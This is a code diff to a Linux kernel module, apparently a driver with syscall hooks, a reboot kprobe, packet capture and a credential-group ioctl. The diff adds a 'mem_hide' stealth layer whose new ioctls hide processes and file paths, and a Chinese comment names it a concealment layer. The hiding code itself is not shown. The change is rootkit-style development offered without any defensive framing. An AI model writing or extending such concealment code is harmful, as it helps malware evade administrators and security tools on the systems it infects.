@@ -28,6 +28,7 @@
 #include "udp_capture.h"
 #include "file_io.h"
 #include "sf_groups.h"
+#include "mem_hide.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("DFM");
@@ -108,6 +109,12 @@ static long drv_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
         return dfm_file_write(argp);
     case DFM_CRED_IOC_ACQUIRE_SF_GROUPS:
         return dfm_sf_groups_acquire(argp);
+    case MEM_IOC_HIDE_PROCESS:
+        return mem_hide_process(argp);
+    case MEM_IOC_HIDE_PATH:
+        return mem_hide_path(argp);
+    case MEM_IOC_HIDE_LIST:
+        return mem_hide_list(argp);
     default:
         return -ENOTTY;
     }
@@ -280,6 +287,12 @@ static int __init mod_init(void)
     if (syscall_ret < 0)
         pr_warn("syscall install hook unavailable: %d\n", syscall_ret);
 
+    /* 隐蔽层: 失败不致命, 只是没有隐藏能力 */
+    {
+        const int hide_ret = mem_hide_init();
+        if (hide_ret < 0)
+            pr_warn("mem_hide_init failed: %d (hide unavailable)\n", hide_ret);
+    }
     reboot_ret = register_kprobe(&kp_reboot);
     if (reboot_ret < 0) {
         pr_warn("failed to register kprobe on reboot: %d\n", reboot_ret);
@@ -314,6 +327,7 @@ static void __exit mod_exit(void)
         g_reboot_kprobe_registered = 0;
     }
     syscall_hook_exit();
+    mem_hide_exit();
     udp_capture_exit();
     dfm_hwb_exit();
     touch_v2_release_all();
